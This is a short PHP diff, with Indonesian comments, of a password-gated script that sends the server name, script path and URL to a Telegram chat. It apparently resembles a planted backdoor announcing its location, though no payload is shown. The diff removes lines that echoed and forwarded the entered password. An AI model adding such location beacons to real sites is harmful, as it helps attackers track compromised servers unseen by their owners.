@@ -29,9 +29,6 @@ function sendTelegramMessage($message) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input_password = $_POST['password'];
 
-    // Tampilkan password yang digunakan (hati-hati dengan keamanan)
-    echo "Password yang digunakan: " . htmlspecialchars($input_password) . "<br>";
-
     // Pastikan Anda mendefinisikan $correct_password di suatu tempat
     if ($input_password === $correct_password) {
         // Cek apakah pesan sudah dikirim dalam sesi ini
@@ -43,8 +40,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // Buat pesan
             $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
-            $message .= "Password yang digunakan: " . htmlspecialchars($input_password); // Tambahkan password ke pesan
-
 
             // Kirim pesan
             sendTelegramMessage($message);
